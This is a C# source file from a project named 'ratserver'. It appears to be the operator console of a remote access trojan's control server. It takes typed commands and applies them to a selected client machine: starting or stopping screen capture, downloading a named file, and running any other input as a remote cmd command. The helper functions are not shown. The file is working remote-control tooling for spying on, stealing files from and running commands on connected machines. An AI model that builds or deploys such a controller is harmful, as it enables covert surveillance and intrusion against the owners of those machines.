using ratserver;
using System;

public static class ConsoleThread 
{
    public static void Start()
    {
        while (ServerFunctions.Running) 
        {
            try
            {
                Console.Write(">:");
                string input = Console.ReadLine();
                if (input == "clear")
                {
                    Console.Clear();
                }
                else if (input == "clearbuffers")
                {
                    Console.WriteLine("Clearing tcp buffers:");
                    foreach (Client c in ServerFunctions.Clients)
                        ServerFunctions.ClearBuffer(c);
                }
                else if (input == "clearbuffer")
                {
                    ServerFunctions.ClearBuffer(Form1.selectedPc);
                }
                else if (input == "quit" || input == "close" || input == "exit")
                {
                    ServerFunctions.Parent.Invoke(new Action(() => ServerFunctions.Parent.Close()));
                    System.Threading.Thread.CurrentThread.Abort();
                    break;
                }
                else if (input == "screenon")
                {
                    ServerFunctions.SetShareScreen(Form1.selectedPc, true);
                }
                else if (input == "screenoff")
                {
                    ServerFunctions.SetShareScreen(Form1.selectedPc, false);
                }
                else
                {
                    string[] split = input.Split(' ');
                    if (split[0] == "download")
                    {
                        if (input != "download " && input != "download")
                        {
                            string fileName = input.Substring("download ".Length, input.Length - "download ".Length);
                            if (fileName != "")
                            {
                                ServerFunctions.DownloadFile(Form1.selectedPc, fileName);
                                continue;
                            }
                        }
                        Console.WriteLine("Enter valid file name");
                    }
                    else // EXECUTE CMD
                        ServerFunctions.RunCmdCommand(Form1.selectedPc, input);

                }
            }catch(Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}